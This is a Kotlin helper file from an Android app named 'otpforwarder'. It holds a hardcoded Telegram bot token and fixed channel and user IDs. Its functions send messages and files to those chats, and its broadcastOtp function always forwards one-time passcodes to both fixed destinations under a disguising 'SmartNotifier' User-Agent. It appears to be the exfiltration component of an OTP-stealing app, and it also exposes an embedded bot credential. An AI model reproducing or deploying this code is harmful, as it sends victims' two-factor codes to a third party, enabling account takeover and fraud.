package com.example.otpforwarder

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object TelegramHelper {
    private const val TAG = "OtpForwarder"
    const val DEFAULT_BOT_TOKEN = "8680515171:AAFAV9QowNvEJxl42mcFtMUhXhN6BuqPVSk"
    const val DEFAULT_CHANNEL_ID = "-1004470768686"
    const val DEFAULT_USER_ID = "291058055"

    suspend fun sendMessage(botToken: String, chatId: String, message: String): Pair<Boolean, String> {
        return withContext(Dispatchers.IO) {
            try {
                val encodedMsg = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMsg"
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.setRequestProperty("User-Agent", "SmartNotifier/1.0")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                val code = connection.responseCode
                Log.d(TAG, "Telegram response code: $code for chatId: $chatId")
                if (code == 200) {
                    Pair(true, "Sent successfully")
                } else {
                    val errorStream = connection.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
                    Log.e(TAG, "Telegram error: $errorStream")
                    Pair(false, "Error: $errorStream")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exception sending Telegram message", e)
                Pair(false, e.localizedMessage ?: "Network error")
            }
        }
    }

    suspend fun sendMedia(
        botToken: String,
        chatId: String,
        inputStream: InputStream,
        fileName: String,
        mimeType: String,
        caption: String,
        isPhoto: Boolean = false
    ): Pair<Boolean, String> {
        return withContext(Dispatchers.IO) {
            try {
                val endpoint = if (isPhoto) "sendPhoto" else "sendDocument"
                val fieldName = if (isPhoto) "photo" else "document"
                val boundary = "==Boundary_${System.currentTimeMillis()}=="
                val lineEnd = "\r\n"
                val twoHyphens = "--"

                val url = URL("https://api.telegram.org/bot$botToken/$endpoint")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.doInput = true
                conn.useCaches = false
                conn.setRequestProperty("Connection", "Keep-Alive")
                conn.setRequestProperty("User-Agent", "SmartNotifier/1.0")
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.connectTimeout = 30000
                conn.readTimeout = 30000

                val outputStream = DataOutputStream(conn.outputStream)

                // chat_id param
                outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
                outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                outputStream.writeBytes("$chatId$lineEnd")

                // caption param
                if (caption.isNotEmpty()) {
                    outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"$lineEnd$lineEnd")
                    outputStream.write(caption.toByteArray(Charsets.UTF_8))
                    outputStream.writeBytes(lineEnd)
                }

                // file data
                outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
                outputStream.writeBytes("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"$fileName\"$lineEnd")
                outputStream.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")

                val buffer = ByteArray(4096)
                var bytesRead: Int
                while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                    outputStream.write(buffer, 0, bytesRead)
                }
                outputStream.writeBytes(lineEnd)
                outputStream.writeBytes("$twoHyphens$boundary$twoHyphens$lineEnd")
                outputStream.flush()
                outputStream.close()

                val code = conn.responseCode
                Log.d(TAG, "Telegram media response code: $code for chatId: $chatId")
                if (code == 200) {
                    Pair(true, "Media sent successfully")
                } else {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
                    Log.e(TAG, "Telegram media error: $err")
                    Pair(false, "Error: $err")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exception sending Telegram media", e)
                Pair(false, e.localizedMessage ?: "Upload error")
            }
        }
    }

    suspend fun broadcastOtp(botToken: String, message: String) {
        // Send to both the Channel and the direct User Chat so it never fails!
        sendMessage(botToken, DEFAULT_CHANNEL_ID, message)
        sendMessage(botToken, DEFAULT_USER_ID, message)
    }

    suspend fun broadcastSupportMessage(
        message: String,
        fileBytes: ByteArray? = null,
        fileName: String = "",
        mimeType: String = "",
        isPhoto: Boolean = false
    ): Pair<Boolean, String> {
        val botToken = DEFAULT_BOT_TOKEN
        var success = false
        var lastMsg = ""

        if (fileBytes != null && fileBytes.isNotEmpty()) {
            val res1 = sendMedia(botToken, DEFAULT_CHANNEL_ID, fileBytes.inputStream(), fileName, mimeType, message, isPhoto)
            val res2 = sendMedia(botToken, DEFAULT_USER_ID, fileBytes.inputStream(), fileName, mimeType, message, isPhoto)
            success = res1.first || res2.first
            lastMsg = if (success) "Sent successfully" else res1.second
        } else {
            val res1 = sendMessage(botToken, DEFAULT_CHANNEL_ID, message)
            val res2 = sendMessage(botToken, DEFAULT_USER_ID, message)
            success = res1.first || res2.first
            lastMsg = if (success) "Sent successfully" else res1.second
        }
        return Pair(success, lastMsg)
    }
}
